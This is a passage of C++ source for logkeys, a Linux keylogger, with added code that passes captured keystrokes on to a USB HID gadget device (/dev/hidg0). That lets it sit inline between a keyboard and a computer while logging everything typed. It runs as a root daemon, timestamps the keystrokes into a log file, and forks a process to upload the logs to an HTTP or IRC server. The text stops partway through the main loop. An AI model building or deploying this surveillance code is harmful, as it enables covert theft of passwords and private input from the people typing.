/*
  Copyleft (ɔ) 2009 Kernc
  This program is free software. It comes with absolutely no warranty whatsoever.
  See COPYING for further information.
  
  Project homepage: https://github.com/kernc/logkeys
*/

#include <cstdio>
#include <cerrno>
#include <cwchar>
#include <vector>
#include <cstring>
#include <fstream>
#include <sstream>
#include <cstdlib>
#include <csignal>
#include <error.h>
#include <netdb.h>
#include <unistd.h>
#include <getopt.h>
#include <wctype.h>
#include <sys/file.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <linux/input.h>
//ADDED
//#include <X11/Xlib.h>
//#include <stdio.h>
//#include <X11/X.h>
//#include <X11/Intrinsic.h>
//#include <X11/StringDefs.h>
//END

#ifdef HAVE_CONFIG_H
# include <config.h>  // include config produced from ./configure
#endif

#ifndef  PACKAGE_VERSION
# define PACKAGE_VERSION "0.1.2"  // if PACKAGE_VERSION wasn't defined in <config.h>
#endif

// the following path-to-executable macros should be defined in config.h;
#ifndef  EXE_PS
# define EXE_PS "/bin/ps"
#endif

#ifndef  EXE_GREP
# define EXE_GREP "/bin/grep"
#endif

#ifndef  EXE_DUMPKEYS
# define EXE_DUMPKEYS "/usr/bin/dumpkeys"
#endif

#define COMMAND_STR_DUMPKEYS ( EXE_DUMPKEYS " -n | " EXE_GREP " '^\\([[:space:]]shift[[:space:]]\\)*\\([[:space:]]altgr[[:space:]]\\)*keycode'" )
#define COMMAND_STR_GET_PID  ( (std::string(EXE_PS " ax | " EXE_GREP " '") + program_invocation_name + "' | " EXE_GREP " -v grep").c_str() )
#define COMMAND_STR_CAPSLOCK_STATE ("{ { xset q 2>/dev/null | grep -q -E 'Caps Lock: +on'; } || { setleds 2>/dev/null | grep -q 'CapsLock on'; }; } && echo on")
#define COMMAND_STR_NUMLOCK_STATE ("{ { xset q 2>/dev/null | grep -q -E 'Num Lock: +on'; } || { setleds 2>/dev/null | grep -q 'NumLock on'; }; } && echo on")

//ADDED by-path/ - REMOVED with new start script
#define INPUT_EVENT_PATH  "/dev/input/"  // standard path
#define DEFAULT_LOG_FILE  "/var/log/logkeys.log"
#define PID_FILE          "/var/run/logkeys.pid"

#include "usage.cc"      // usage() function
#include "args.cc"       // global arguments struct and arguments parsing
#include "keytables.cc"  // character and function key tables and helper functions
#include "upload.cc"     // functions concerning remote uploading of log file

namespace logkeys {

// executes cmd and returns string ouput
std::string execute(const char* cmd)
{
    FILE* pipe = popen(cmd, "r");
    if (!pipe)
      error(EXIT_FAILURE, errno, "Pipe error");
    char buffer[128];
    std::string result = "";
    while(!feof(pipe))
    	if(fgets(buffer, 128, pipe) != NULL)
    		result += buffer;
    pclose(pipe);
    return result;
}


int input_fd = -1;  // input event device file descriptor; global so that signal_handler() can access it
//ADDED
int output_fd = -1;

void signal_handler(int signal)
{
  if (input_fd != -1)
    close(input_fd);  // closing input file will break the infinite while loop
}

void set_utf8_locale()
{
  // set locale to common UTF-8 for wchars to be recognized correctly
  if(setlocale(LC_CTYPE, "en_US.UTF-8") == NULL) { // if en_US.UTF-8 isn't available
    char *locale = setlocale(LC_CTYPE, "");  // try the locale that corresponds to the value of the associated environment variable LC_CTYPE
    if (locale != NULL && 
        (strstr(locale, "UTF-8") != NULL || strstr(locale, "UTF8") != NULL ||
         strstr(locale, "utf-8") != NULL || strstr(locale, "utf8") != NULL) )
      ;  // if locale has "UTF-8" in its name, it is cool to do nothing
    else
      error(EXIT_FAILURE, 0, "LC_CTYPE locale must be of UTF-8 type, or you need en_US.UTF-8 availabe");
  }
}

void exit_cleanup(int status, void *discard)
{
  // TODO:
}

void create_PID_file()
{
  // create temp file carrying PID for later retrieval
  int pid_fd = open(PID_FILE, O_WRONLY | O_CREAT | O_EXCL, 0644);
  if (pid_fd != -1) {
    char pid_str[16] = {0};
    sprintf(pid_str, "%d", getpid());
    if (write(pid_fd, pid_str, strlen(pid_str)) == -1)
      error(EXIT_FAILURE, errno, "Error writing to PID file '" PID_FILE "'");
    close(pid_fd);
  }
  else {
    if (errno == EEXIST)  // This should never happen
         error(EXIT_FAILURE, errno, "Another process already running? Quitting. (" PID_FILE ")");
    else error(EXIT_FAILURE, errno, "Error opening PID file '" PID_FILE "'");
  }
}

void kill_existing_process()
{
  pid_t pid;
  bool via_file = true;
  bool via_pipe = true;
  FILE *temp_file = fopen(PID_FILE, "r");
  
  via_file &= (temp_file != NULL);
  
  if (via_file) {  // kill process with pid obtained from PID file
    via_file &= (fscanf(temp_file, "%d", &pid) == 1);
    fclose(temp_file);
  }
  
  if (!via_file) {  // if reading PID from temp_file failed, try ps-grep pipe
    via_pipe &= (sscanf(execute(COMMAND_STR_GET_PID).c_str(), "%d", &pid) == 1);
    via_pipe &= (pid != getpid());
  }
  
  if (via_file || via_pipe) {
    remove(PID_FILE);
    kill(pid, SIGINT);

    exit(EXIT_SUCCESS);  // process killed successfully, exit
  }
  error(EXIT_FAILURE, 0, "No process killed");
}

void set_signal_handling()
{ // catch SIGHUP, SIGINT and SIGTERM signals to exit gracefully
  struct sigaction act = {{0}};
  act.sa_handler = signal_handler;
  sigaction(SIGHUP,  &act, NULL);
  sigaction(SIGINT,  &act, NULL);
  sigaction(SIGTERM, &act, NULL);
  // prevent child processes from becoming zombies
  act.sa_handler = SIG_IGN;
  sigaction(SIGCHLD, &act, NULL);
}

void determine_system_keymap()
{
  // custom map will be used; erase existing US keymapping
  memset(char_keys,  '\0', sizeof(char_keys));
  memset(shift_keys, '\0', sizeof(shift_keys));
  memset(altgr_keys, '\0', sizeof(altgr_keys));
  
  // get keymap from dumpkeys
  // if one knows of a better, more portable way to get wchar_t-s from symbolic keysym-s from `dumpkeys` or `xmodmap` or another, PLEASE LET ME KNOW! kthx
  std::stringstream ss, dump(execute(COMMAND_STR_DUMPKEYS));  // see example output after i.e. `loadkeys slovene`
  std::string line;

  unsigned int i = 0;   // keycode
  int index;
  int utf8code;      // utf-8 code of keysym answering keycode i
  
  while (std::getline(dump, line)) {
    ss.clear();
    ss.str("");
    utf8code = 0;
    
    // replace any U+#### with 0x#### for easier parsing
    index = line.find("U+", 0);
    while (static_cast<std::string::size_type>(index) != std::string::npos) {
      line[index] = '0'; line[index + 1] = 'x';
      index = line.find("U+", index);
    }
    
    if (++i >= sizeof(char_or_func)) break;  // only ever map keycodes up to 128 (currently N_KEYS_DEFINED are used)
    if (!is_char_key(i)) continue;  // only map character keys of keyboard
    
    assert(line.size() > 0);
    if (line[0] == 'k') {  // if line starts with 'keycode'
      index = to_char_keys_index(i);
      
      ss << &line[14];  // 1st keysym starts at index 14 (skip "keycode XXX = ")
      ss >> std::hex >> utf8code;
      // 0XB00CLUELESS: 0xB00 is added to some keysyms that are preceeded with '+'; I don't really know why; see `man keymaps`; `man loadkeys` says numeric keysym values aren't to be relied on, orly?
      if (line[14] == '+' && (utf8code & 0xB00)) utf8code ^= 0xB00; 
      char_keys[index] = static_cast<wchar_t>(utf8code);
      
      // if there is a second keysym column, assume it is a shift column
      if (ss >> std::hex >> utf8code) {
        if (line[14] == '+' && (utf8code & 0xB00)) utf8code ^= 0xB00;
        shift_keys[index] = static_cast<wchar_t>(utf8code);
      }
      
      // if there is a third keysym column, assume it is an altgr column
      if (ss >> std::hex >> utf8code) {
        if (line[14] == '+' && (utf8code & 0xB00)) utf8code ^= 0xB00;
        altgr_keys[index] = static_cast<wchar_t>(utf8code);
      }
      
      continue;
    }
    
    // else if line starts with 'shift i'
    index = to_char_keys_index(--i);
    ss << &line[21];  // 1st keysym starts at index 21 (skip "\tshift\tkeycode XXX = " or "\taltgr\tkeycode XXX = ")
    ss >> std::hex >> utf8code;
    if (line[21] == '+' && (utf8code & 0xB00)) utf8code ^= 0xB00;  // see line 0XB00CLUELESS
    
    if (line[1] == 's')  // if line starts with "shift"
      shift_keys[index] = static_cast<wchar_t>(utf8code);
    if (line[1] == 'a')  // if line starts with "altgr"
      altgr_keys[index] = static_cast<wchar_t>(utf8code);
  } // while (getline(dump, line))
}


void parse_input_keymap()
{
  // custom map will be used; erase existing US keytables
  memset(char_keys,  '\0', sizeof(char_keys));
  memset(shift_keys, '\0', sizeof(shift_keys));
  memset(altgr_keys, '\0', sizeof(altgr_keys));
  
  stdin = freopen(args.keymap.c_str(), "r", stdin);
  if (stdin == NULL)
    error(EXIT_FAILURE, errno, "Error opening input keymap '%s'", args.keymap.c_str());
  
  unsigned int i = -1;
  unsigned int line_number = 0;
  wchar_t func_string[32];
  wchar_t line[32];
  
  while (!feof(stdin)) {
    
    if (++i >= sizeof(char_or_func)) break;  // only ever read up to 128 keycode bindings (currently N_KEYS_DEFINED are used)
    
    if (is_used_key(i)) {
      ++line_number;
      if(fgetws(line, sizeof(line), stdin) == NULL) {
        if (feof(stdin)) break;
        else error_at_line(EXIT_FAILURE, errno, args.keymap.c_str(), line_number, "fgets() error");
      }
      // line at most 8 characters wide (func lines are "1234567\n", char lines are "1 2 3\n")
      if (wcslen(line) > 8) // TODO: replace 8*2 with 8 and wcslen()!
        error_at_line(EXIT_FAILURE, 0, args.keymap.c_str(), line_number, "Line too long!");
      // terminate line before any \r or \n
      std::wstring::size_type last = std::wstring(line).find_last_not_of(L"\r\n");
      if (last == std::wstring::npos)
        error_at_line(EXIT_FAILURE, 0, args.keymap.c_str(), line_number, "No characters on line");
      line[last + 1] = '\0';
    }
    
    if (is_char_key(i)) {
      unsigned int index = to_char_keys_index(i);
      if (swscanf(line, L"%lc %lc %lc", &char_keys[index], &shift_keys[index], &altgr_keys[index]) < 1) {
        error_at_line(EXIT_FAILURE, 0, args.keymap.c_str(), line_number, "Too few input characters on line");
      }
    }
    if (is_func_key(i)) {
      if (i == KEY_SPACE) continue;  // space causes empty string and trouble
      if (swscanf(line, L"%7ls", &func_string[0]) != 1)
        error_at_line(EXIT_FAILURE, 0, args.keymap.c_str(), line_number, "Invalid function key string");  // does this ever happen?
      wcscpy(func_keys[to_func_keys_index(i)], func_string);
    }
  } // while (!feof(stdin))
  fclose(stdin);
  
  if (line_number < N_KEYS_DEFINED)
#define QUOTE(x) #x  // quotes x so it can be used as (char*)
    error(EXIT_FAILURE, 0, "Too few lines in input keymap '%s'; There should be " QUOTE(N_KEYS_DEFINED) " lines!", args.keymap.c_str());
}

void export_keymap_to_file()
{
  int keymap_fd = open(args.keymap.c_str(), O_CREAT | O_EXCL | O_WRONLY, 0644);
  if (keymap_fd == -1)
    error(EXIT_FAILURE, errno, "Error opening output file '%s'", args.keymap.c_str());
  char buffer[32];
  int buflen = 0;
  unsigned int index;
  for (unsigned int i = 0; i < sizeof(char_or_func); ++i) {
    buflen = 0;
    if (is_char_key(i)) {
      index = to_char_keys_index(i);
      // only export non-null characters
      if (char_keys[index]  != L'\0' && 
          shift_keys[index] != L'\0' && 
          altgr_keys[index] != L'\0')
        buflen = sprintf(buffer, "%lc %lc %lc\n", char_keys[index], shift_keys[index], altgr_keys[index]);
      else if (char_keys[index]  != L'\0' && 
               shift_keys[index] != L'\0')
        buflen = sprintf(buffer, "%lc %lc\n", char_keys[index], shift_keys[index]);
      else if (char_keys[index] != L'\0')
        buflen = sprintf(buffer, "%lc\n", char_keys[index]);
      else  // if all \0, export nothing on that line (=keymap will not parse)
        buflen = sprintf(buffer, "\n");
    }
    else if (is_func_key(i)) {
      buflen = sprintf(buffer, "%ls\n", func_keys[to_func_keys_index(i)]);
    }
    
    if (is_used_key(i))
      if (write(keymap_fd, buffer, buflen) < buflen)
        error(EXIT_FAILURE, errno, "Error writing to keymap file '%s'", args.keymap.c_str());
  }
  close(keymap_fd);
  error(EXIT_SUCCESS, 0, "Success writing keymap to file '%s'", args.keymap.c_str());
  exit(EXIT_SUCCESS);
}

void determine_input_device()
{
  // better be safe than sory: while running other programs, switch user to nobody
  setegid(65534); seteuid(65534);
  
  // extract input number from /proc/bus/input/devices (I don't know how to do it better. If you have an idea, please let me know.)
  // The compiler automatically concatenates these adjacent strings to a single string.
  const char* cmd = EXE_GREP " -E 'Handlers|EV=' /proc/bus/input/devices | "
    EXE_GREP " -B1 'EV=1[02]001[3Ff]' | "
    EXE_GREP " -Eo 'event[0-9]+' ";
  std::stringstream output(execute(cmd));
  
  std::vector<std::string> results;
  std::string line;
  
  while(std::getline(output, line)) {
    std::string::size_type i = line.find("event");
    if (i != std::string::npos) i += 5; // "event".size() == 5
    if (i < line.size()) {
      int index = atoi(&line.c_str()[i]);
      
      if (index != -1) {
        std::stringstream input_dev_path;
        input_dev_path << INPUT_EVENT_PATH;
        input_dev_path << "event";
        input_dev_path << index;

        results.push_back(input_dev_path.str());
      }
    }
  }
  
  if (results.size() == 0) {
    error(0, 0, "Couldn't determine keyboard device. :/");
    error(EXIT_FAILURE, 0, "Please post contents of your /proc/bus/input/devices file as a new bug report. Thanks!");
  }

  args.device = results[0];  // for now, use only the first found device
  
  // now we reclaim those root privileges
  seteuid(0); setegid(0);
}

//ADDED function
int translate_code(int inputkey)
{
	switch(inputkey) {
            // Numbers 1-0
			case 2 :
            return 0x1e;
            break;
            case 3 :
            return 0x1f;
            break;
            case 4 :
            return 0x20;
            break;
            case 5 :
            return 0x21;
            break;
            case 6 :
            return 0x22;
            break;
            case 7 :
            return 0x23;
            break;
            case 8 :
            return 0x24;
            break;
            case 9 :
            return 0x25;
            break;
            case 10 :
            return 0x26;
            break;
            case 11 :
            return 0x27;
            break;
            //BACKSPACE
            case 14 :
            return 0x2a;
            break;
			//Delete
			case 111 :
            return 0x4c;
            break;
			//Escape
			case 1 :
			return 0x29;
			break;
            //TAB
            case 15 :
            return 0x2b;
            break;
            //keyboard top row q-p
            case 16 :
            return 0x14;
            break;
            case 17 :
            return 0x1a;
            break;
            case 18 :
            return 0x08;
            break;
            case 19 :
            return 0x15;
            break;
            case 20 :
            return 0x17;
            break;
            case 21 :
            return 0x1c;
            break;
            case 22 :
            return 0x18;
            break;
            case 23 :
            return 0x0c;
            break;
            case 24 :
            return 0x12;
            break;
            case 25 :
            return 0x13;
            break;
            //ENTER
            case 28 :
            return 0x28;
            break;
            //keyboard middle row a-l
            case 30 :
            return 0x04;
            break;
            case 31 :
            return 0x16;
            break;
            case 32 :
            return 0x07;
            break;
            case 33 :
            return 0x09;
            break;
            case 34 :
            return 0x0a;
            break;
            case 35 :
            return 0x0b;
            break;
            case 36 :
            return 0x0d;
            break;
            case 37 :
            return 0x0e;
            break;
            case 38 :
            return 0x0f;
            break;
            
            //KEYBOARD bottom row z-m
            case 44 :
            return 0x1d;
            break;
            case 45 :
            return 0x1b;
            break;
            case 46 :
            return 0x06;
            break;
            case 47 :
            return 0x19;
            break;
            case 48 :
            return 0x05;
            break;
            case 49 :
            return 0x11;
            break;
            case 50 :
            return 0x10;
            break;
            case 57 :
            return 0x2c;
            break;
            //NUMPAD 7-9
            case 71 :
            return 0x5f;
            break;
            case 72 :
            return 0x60;
            break;
            case 73 :
            return 0x61;
            break;
            //KPMINUS
            case 74 :
            return 0x56;
            break;
            //NUMPAD 4-6
            case 75 :
            return 0x5c;
            break;
            case 76 :
            return 0x5d;
            break;
            case 77 :
            return 0x5e;
            break;
            //KPPLUS
            case 78 :
            return 0x57;
            break;
            //NUMPAD 1,2,3,0
            case 79 :
            return 0x59;
            break;
            case 80 :
            return 0x5a;
            break;
            case 81 :
            return 0x5b;
            break;
            case 82 :
            return 0x62;
            break;
            //KPDOT
            case 83 :
            return 0x63;
            break;
            //KPENTER
            case 96 :
            return 0x58;
            break;
			//Function Keys
			//LCTRL
			case 29:
			return 0x00;
			break;
			//LSHIFT
			case 42:
			return 0x00;
			break;
			//LALT
			case 56:
			return 0x00;
			break;
			//RCTRL
			case 97:
			return 0x00;
			break;
			//RSHIFT
			case 54:
			return 0x00;
			break;
			//RALT
			case 100:
			return 0x00;
			break;
			//SYMBOLS
			//MINUS
			case 12:
			return 0x2d;
			break;
			//equal
			case 13:
			return 0x2e;
			break;
			//leftbrace
			case 26:
			return 0x2f;
			break;
			//rightbrace
			case 27:
			return 0x30;
			break;
			//backslash
			case 43:
			return 0x31;
			break;
			//semicolon
			case 39:
			return 0x33;
			break;
			//apostrophe
			case 40:
			return 0x34;
			break;
			//comma
			case 51:
			return 0x36;
			break;
			//dot
			case 52:
			return 0x37;
			break;
			//slash
			case 53:
			return 0x38;
			break;
			//grave `
			case 41:
			return 0x35;
			break;
			//F-Keys
			//F1
			case 59:
			return 0x3a;
			break;
			//F2
			case 60:
			return 0x3b;
			break;
			//F3
			case 61:
			return 0x3c;
			break;
			//F4
			case 62:
			return 0x3d;
			break;
			//F5
			case 63:
			return 0x3e;
			break;
			//F6
			case 64:
			return 0x3f;
			break;
			//F7
			case 65:
			return 0x40;
			break;
			//F8
			case 66:
			return 0x41;
			break;
			//F9
			case 67:
			return 0x42;
			break;
			//F10
			case 68:
			return 0x43;
			break;
			//F11
			case 87:
			return 0x44;
			break;
			//F12
			case 88:
			return 0x45;
			break;
			//specials
			//HOME
			case 102:
			return 0x4a;
			break;
			//END
			case 107:
			return 0x4d;
			break;
			//PGUP
			case 104:
			return 0x4b;
			break;
			//PGDOWN
			case 109:
			return 0x4e;
			break;
			//prtscr
			case 99:
			return 0x46;
			break;
			//ARROWS
			//up
			case 103:
			return 0x52;
			break;
			//down
			case 108:
			return 0x51;
			break;
			//left
			case 105:
			return 0x50;
			break;
			//right
			case 106:
			return 0x4f;
			break;
			//META - Windows key
			//left meta
			case 125:
			return 0x00;
			break;
			//right meta
			case 126:
			return 0x00;
			break;
			//CapsLock
			case 58:
			return 0x39;
			break;
			//NumLock
			case 69:
			return 0x53;
			break;
			//ScrollLock
			case 70:
			return 0x47;
			break;
			//Pause
			case 119:
			return 0x48;
			break;
			
            default :
            return 0x0f;
          }

}

int main(int argc, char **argv)
{  
  on_exit(exit_cleanup, NULL);
  //ADDED
  //Display  *disp;
  //disp = XOpenDisplay(":0");
  //XGrabKeyboard(disp, DefaultRootWindow(disp), TRUE, GrabModeAsync,GrabModeAsync, CurrentTime);
  //XGrabPointer(disp, DefaultRootWindow(disp), TRUE, 0,GrabModeAsync,GrabModeAsync, None, None, CurrentTime);
  //END

  args.logfile = (char*) DEFAULT_LOG_FILE;  // default log file will be used if none specified
  
  process_command_line_arguments(argc, argv);
  
  if (geteuid()) error(EXIT_FAILURE, errno, "Got r00t?");
  // kill existing logkeys process
  if (args.kill) kill_existing_process();
  
  // if neither start nor export, that must be an error
  if (!args.start && !(args.flags & FLAG_EXPORT_KEYMAP)) { usage(); exit(EXIT_FAILURE); }
  
  // if posting remote and post_size not set, set post_size to default [500K bytes]
  if (args.post_size == 0 && (!args.http_url.empty() || !args.irc_server.empty())) {
    args.post_size = 500000;
  }
  
  // check for incompatible flags
  if (!args.keymap.empty() && (!(args.flags & FLAG_EXPORT_KEYMAP) && args.us_keymap)) {  // exporting uses args.keymap also
    error(EXIT_FAILURE, 0, "Incompatible flags '-m' and '-u'. See usage.");
  }

  // check for incompatible flags: if posting remote and output is set to stdout
  if (args.post_size != 0 && ( args.logfile == "-" )) {
    error(EXIT_FAILURE, 0, "Incompatible flags [--post-size | --post-http] and --output to stdout");
  }
  
  set_utf8_locale();
  
  if (args.flags & FLAG_EXPORT_KEYMAP) {
    if (!args.us_keymap) 
      determine_system_keymap();
    export_keymap_to_file();
    // = exit(0)
  }
  else if (!args.keymap.empty())  // custom keymap in use
    parse_input_keymap();
  else
    determine_system_keymap();
  
  if (args.device.empty()) {  // no device given with -d switch
    determine_input_device();
  } 
  else {  // event device supplied as -d argument
    std::string::size_type i = args.device.find_last_of('/');
    args.device = (std::string(INPUT_EVENT_PATH) + args.device.substr(i == std::string::npos ? 0 : i + 1));
  }
  
  set_signal_handling();
  
  close(STDIN_FILENO);
  // leave stderr open
  if (args.logfile != "-") {
    close(STDOUT_FILENO);
  }
  
  // open input device for reading
  input_fd = open(args.device.c_str(), O_RDONLY);
  if (input_fd == -1) {
    error(EXIT_FAILURE, errno, "Error opening input event device '%s'", args.device.c_str());
  }

  //ADDED KEYOUT DEVICE
  static const char *DEV_KEYBOARD = "/dev/hidg0";
  output_fd = open(DEV_KEYBOARD, O_WRONLY);
  FILE * client_fd;
    if (output_fd == -1) {
    error(EXIT_FAILURE, errno, "Error opening output device '%s'", DEV_KEYBOARD);
  }
  client_fd=fopen ("/dev/hidg0","r");
  if (client_fd==NULL) perror ("Error opening file");
  else
	  {
		int fd = fileno(client_fd);	  
	    int flags;
	    flags = fcntl(fd, F_GETFL, 0);
	    flags |= O_NONBLOCK;
	    fcntl(fd, F_SETFL, flags);
      }
  
  //END OF ADDITION
  
  // if log file is other than default, then better seteuid() to the getuid() in order to ensure user can't write to where she shouldn't!
  if (args.logfile == DEFAULT_LOG_FILE) {
    seteuid(getuid());
    setegid(getgid());
  }
  
  // open log file (if file doesn't exist, create it with safe 0600 permissions)
  umask(0177);
  FILE *out = NULL;
  
  if (args.logfile == "-") {
    out = stdout;
  }
  else {
    out = fopen(args.logfile.c_str(), "a");
  }
  if (!out)
    error(EXIT_FAILURE, errno, "Error opening output file '%s'", args.logfile.c_str());

  if (access(PID_FILE, F_OK) != -1)  // PID file already exists
    error(EXIT_FAILURE, errno, "Another process already running? Quitting. (" PID_FILE ")");

  if (!(args.flags & FLAG_NO_DAEMON)) {
    int noclose = 1;  // don't close streams (stderr used)
    if (daemon(0, noclose) == -1)  // become daemon
      error(EXIT_FAILURE, errno, "Failed to become daemon");
  }

  // now we need those privileges back in order to create system-wide PID_FILE
  seteuid(0); setegid(0);
  if (!(args.flags & FLAG_NO_DAEMON)) {
    create_PID_file();
  }
  
  // now we've got everything we need, finally drop privileges by becoming 'nobody'
  //setegid(65534); seteuid(65534);   // commented-out, I forgot why xD
  
  unsigned int scan_code, prev_code = 0;  // the key code of the pressed key (some codes are from "scan code set 1", some are different (see <linux/input.h>)
  struct input_event event;
  char timestamp[32];  // timestamp string, long enough to hold format "\n%F %T%z > "
  //bool capslock_in_effect = execute(COMMAND_STR_CAPSLOCK_STATE).size() >= 2;
  bool capslock_in_effect = false;
  bool shift_in_effect = false;
  bool altgr_in_effect = false;
  bool ctrl_in_effect = false;  // used for identifying Ctrl+C / Ctrl+D
  bool meta_in_effect = false;
  int count_repeats = 0;  // count_repeats differs from the actual number of repeated characters! afaik, only the OS knows how these two values are related (by respecting configured repeat speed and delay)
  //ADDED
  char ledlocation[100];
  char leds[32];
  uint8_t output_code[8] = {0,0,0,0,0,0,0,0};
  uint8_t output_null[8] = {0,0,0,0,0,0,0,0};
  
  struct stat st;
  stat(args.logfile.c_str(), &st);
  off_t file_size = st.st_size;  // log file is currently file_size bytes "big"
  int inc_size;  // is added to file_size in each iteration of keypress reading, adding number of bytes written to log file in that iteration
  
  time_t cur_time;
  time(&cur_time);
#define TIME_FORMAT "%F %T%z > "  // results in YYYY-mm-dd HH:MM:SS+ZZZZ
  strftime(timestamp, sizeof(timestamp), TIME_FORMAT, localtime(&cur_time));
  
  if (args.flags & FLAG_NO_TIMESTAMPS)
    file_size += fprintf(out, "Logging started at %s\n\n", timestamp);
  else
    file_size += fprintf(out, "Logging started ...\n\n%s", timestamp);
  fflush(out);
  
  // infinite loop: exit gracefully by receiving SIGHUP, SIGINT or SIGTERM (of which handler closes input_fd)
  while (read(input_fd, &event, sizeof(struct input_event)) > 0) {
    
// these event.value-s aren't defined in <linux/input.h> ?
#define EV_MAKE   1  // when key pressed
#define EV_BREAK  0  // when key released
#define EV_REPEAT 2  // when key switches to repeating after short delay
    //ADDED
    //uint8_t output_code[8] = {0,0,0,0,0,0,0,0};
    //uint8_t output_null[8] = {0,0,0,0,0,0,0,0};
	//POLLING FOR OUTPUT REPORTS (CURRENT LED STATUS)
	int c;
	c = fgetc (client_fd);
	//LOGGING
    if (c >= 0) {
	fprintf (out,"The file contains the value %d.\n",c);
	//fprintf (out,"bitwise and 1 %d\n",c&1);
	//fprintf (out,"bitwise and 2 %d\n",c&2);
	//fprintf (out,"bitwise and 4 %d\n",c&4);
	if ( (c & 1) == 1) {
		//num lock on
		fprintf (out,"num lock on\n");
		strcpy(leds,execute("cd /sys/class/leds && ls -d *numlock").c_str());
		leds[strlen(leds)-1] = '\0';
		strcpy(ledlocation, "echo 1 > /sys/class/leds/");
		strcat(ledlocation, leds);
		strcat(ledlocation,"/brightness");
		fprintf(out, "Output code (ledlocation):%s\n", ledlocation);
		execute(ledlocation);
	}
	else {
		strcpy(leds,execute("cd /sys/class/leds && ls -d *numlock").c_str());
		leds[strlen(leds)-1] = '\0';
		strcpy(ledlocation, "echo 0 > /sys/class/leds/");
		strcat(ledlocation, leds);
		strcat(ledlocation,"/brightness");
		fprintf(out, "Output code (ledlocation):%s\n", ledlocation);
		execute(ledlocation);
	}
	
	if ((c & 2) == 2) {
		//caps lock on
		fprintf (out,"caps lock on\n");
		strcpy(leds,execute("cd /sys/class/leds && ls -d *capslock").c_str());
		leds[strlen(leds)-1] = '\0';
		strcpy(ledlocation, "echo 1 > /sys/class/leds/");
		strcat(ledlocation, leds);
		strcat(ledlocation,"/brightness");
		fprintf(out, "Output code (ledlocation):%s\n", ledlocation);
		execute(ledlocation);
		capslock_in_effect = true;
	}
	else {
		strcpy(leds,execute("cd /sys/class/leds && ls -d *capslock").c_str());
		leds[strlen(leds)-1] = '\0';
		strcpy(ledlocation, "echo 0 > /sys/class/leds/");
		strcat(ledlocation, leds);
		strcat(ledlocation,"/brightness");
		fprintf(out, "Output code (ledlocation):%s\n", ledlocation);
		execute(ledlocation);
		capslock_in_effect = false;
	}
	
	if ((c & 4) == 4) {
		//scroll lock on
		fprintf (out,"scroll lock on\n");
		strcpy(leds,execute("cd /sys/class/leds && ls -d *scrolllock").c_str());
		leds[strlen(leds)-1] = '\0';
		strcpy(ledlocation, "echo 1 > /sys/class/leds/");
		strcat(ledlocation, leds);
		strcat(ledlocation,"/brightness");
		fprintf(out, "Output code (ledlocation):%s\n", ledlocation);
		execute(ledlocation);
	}
	else {
		strcpy(leds,execute("cd /sys/class/leds && ls -d *scrolllock").c_str());
		leds[strlen(leds)-1] = '\0';
		strcpy(ledlocation, "echo 0 > /sys/class/leds/");
		strcat(ledlocation, leds);
		strcat(ledlocation,"/brightness");
		fprintf(out, "Output code (ledlocation):%s\n", ledlocation);
		execute(ledlocation);
	}
	
	if ((c & 7) == 0) {
		fprintf (out,"no leds on\n");
	}
	}
	
	
    if (event.type != EV_KEY) continue;  // keyboard events are always of type EV_KEY
    
    inc_size = 0;
    scan_code = event.code;
    
    if (scan_code >= sizeof(char_or_func)) {  // keycode out of range, log error
      inc_size += fprintf(out, "<E-%x>", scan_code);
      if (inc_size > 0) file_size += inc_size;
      continue;
    }
    
    // if remote posting is enabled and size treshold is reached
    if (args.post_size != 0 && file_size >= args.post_size && stat(UPLOADER_PID_FILE, &st) == -1) {
      fclose(out);
      
      std::stringstream ss;
      for (int i = 1;; ++i) {
        ss.clear();
        ss.str("");
        ss << args.logfile << "." << i;
        if (stat(ss.str().c_str(), &st) == -1) break;  // file .log.i doesn't yet exist
      }
      
      if (rename(args.logfile.c_str(), ss.str().c_str()) == -1)  // move current log file to indexed
        error(EXIT_FAILURE, errno, "Error renaming logfile");
      
      out = fopen(args.logfile.c_str(), "a");  // open empty log file with the same name
      if (!out)
        error(EXIT_FAILURE, errno, "Error opening output file '%s'", args.logfile.c_str());
      
      file_size = 0;  // new log file is now empty
      
      // write new timestamp
      time(&cur_time);
      strftime(timestamp, sizeof(timestamp), TIME_FORMAT, localtime(&cur_time));
      if (args.flags & FLAG_NO_TIMESTAMPS)
        file_size += fprintf(out, "Logging started at %s\n\n", timestamp);
      else
        file_size += fprintf(out, "Logging started ...\n\n%s", timestamp);
      
      if (!args.http_url.empty() || !args.irc_server.empty()) {
        switch (fork()) {
        case -1: error(0, errno, "Error while forking remote-posting process");
        case 0:  
          start_remote_upload();  // child process will upload the .log.i files
          exit(EXIT_SUCCESS);
        }
      }
    }
    
    // on key repeat ; must check before on key press
    if (event.value == EV_REPEAT) {
      ++count_repeats;
      //ADDED - not quite perfect, but a start
      if (is_char_key(scan_code)) {
        //fprintf(out, "Repeat code:%d\n", scan_code);
        output_code[2] = translate_code(scan_code);          
        write(output_fd, output_code, 8);
        //write(output_fd, output_null, 8);
      }
    } else if (count_repeats) {
      if (prev_code == KEY_RIGHTSHIFT || prev_code == KEY_LEFTCTRL || 
          prev_code == KEY_RIGHTALT   || prev_code == KEY_LEFTALT  || 
          prev_code == KEY_LEFTSHIFT  || prev_code == KEY_RIGHTCTRL);  // if repeated key is modifier, do nothing
      else {
        if ((args.flags & FLAG_NO_FUNC_KEYS) && is_func_key(prev_code));  // if repeated was function key, and if we don't log function keys, then don't log repeat either
        else {
          inc_size += fprintf(out, "<#+%d>", count_repeats);
        }
      }
      count_repeats = 0;  // reset count for future use
    }
    
    // on key press
    if (event.value == EV_MAKE) {
      
      // on ENTER key or Ctrl+C/Ctrl+D event append timestamp
      if (scan_code == KEY_ENTER || scan_code == KEY_KPENTER ||
          (ctrl_in_effect && (scan_code == KEY_C || scan_code == KEY_D))) {
        if (ctrl_in_effect)
          inc_size += fprintf(out, "%lc", char_keys[to_char_keys_index(scan_code)]);  // log C or D
        if (args.flags & FLAG_NO_TIMESTAMPS) {
          inc_size += fprintf(out, "\n");
          //ADDED
          //fprintf(out, "Enter code:%d\n", scan_code);
          output_code[2] = translate_code(scan_code);          
          write(output_fd, output_code, 8);
          //write(output_fd, output_null, 8);
        }
        else {
          strftime(timestamp, sizeof(timestamp), "\n" TIME_FORMAT, localtime(&event.time.tv_sec));
          inc_size += fprintf(out, "%s", timestamp);  // then newline and timestamp
          //ADDED
          //fprintf(out, "Enter code:%d\n", scan_code);
          output_code[2] = translate_code(scan_code);         
          write(output_fd, output_code, 8);
          //write(output_fd, output_null, 8);
        }
        if (inc_size > 0) file_size += inc_size;
